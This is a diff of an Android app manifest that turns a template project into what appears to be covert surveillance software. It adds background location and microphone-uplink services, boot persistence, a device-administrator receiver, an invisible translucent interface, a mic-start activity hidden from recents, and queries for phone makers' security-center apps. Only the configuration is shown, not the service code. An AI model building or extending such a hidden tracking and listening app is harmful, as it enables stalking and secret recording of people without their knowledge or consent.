@@ -1,30 +1,138 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
+    <!-- Network -->
     <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <!-- Location -->
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- Background / wake -->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <!-- Foreground service (location + specialUse fallback for Android 14+) -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+
+    <!-- Notifications (required on Android 13+ for the FGS notification) -->
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- Exact alarms (Android 12+ / 13+) -->
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+
+    <!-- OEM resilience -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <!-- Visible to other apps we deep-link into (Android 11+ package visibility) -->
+    <queries>
+        <intent>
+            <action android:name="android.intent.action.MAIN" />
+       </intent>
+        <intent>
+            <action android:name="android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS" />
+       </intent>
+        <intent>
+            <action android:name="android.settings.APPLICATION_DETAILS_SETTINGS" />
+       </intent>
+        <intent>
+            <action android:name="android.settings.REQUEST_SCHEDULE_EXACT_ALARM" />
+       </intent>
+        <intent>
+            <action android:name="android.settings.APP_NOTIFICATION_SETTINGS" />
+       </intent>
+        <!-- Xiaomi -->
+        <package android:name="com.miui.securitycenter" />
+        <!-- Oppo -->
+        <package android:name="com.coloros.safecenter" />
+        <package android:name="com.oppo.safe" />
+        <!-- Vivo -->
+        <package android:name="com.vivo.permissionmanager" />
+        <!-- Huawei -->
+        <package android:name="com.huawei.systemmanager" />
+        <!-- Samsung -->
+        <package android:name="com.samsung.android.lool" />
+        <!-- OnePlus -->
+        <package android:name="com.oneplus.security" />
+        <!-- Realme -->
+        <package android:name="com.realme.securitycenter" />
+        <!-- Letv -->
+        <package android:name="com.letv.android.letvsafe" />
+        <!-- Asus -->
+        <package android:name="com.asus.mobilemanager" />
+   </queries>
 
     <application
         android:allowBackup="true"
-        android:dataExtractionRules="@xml/data_extraction_rules"
-        android:enableOnBackInvokedCallback="true"
-        android:fullBackupContent="@xml/backup_rules"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
-        android:usesCleartextTraffic="true"
-        android:theme="@style/Theme.MyApplication">
+        android:theme="@android:style/Theme.Translucent.NoTitleBar">
         <activity
             android:name=".MainActivity"
             android:exported="true"
-            android:theme="@style/Theme.MyApplication">
+            android:theme="@android:style/Theme.Translucent.NoTitleBar">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
-
                 <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
-    </application>
+           </intent-filter>
+       </activity>
 
+        <activity
+            android:name=".MicStartActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:taskAffinity=""
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <service
+            android:name=".LiveLocationService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="location|specialUse">
+            <property
+                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+                android:value="Persistent device location reporting for live tracking; required to keep GPS updates flowing while the app is not in the foreground." />
+       </service>
+
+        <service
+            android:name=".AudioUplinkService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="microphone">
+      </service>
+
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+           </intent-filter>
+       </receiver>
+
+        <receiver
+            android:name=".AdminReceiver"
+            android:description="@string/admin_description"
+            android:label="@string/admin_label"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_policies" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+           </intent-filter>
+       </receiver>
+   </application>
 </manifest>
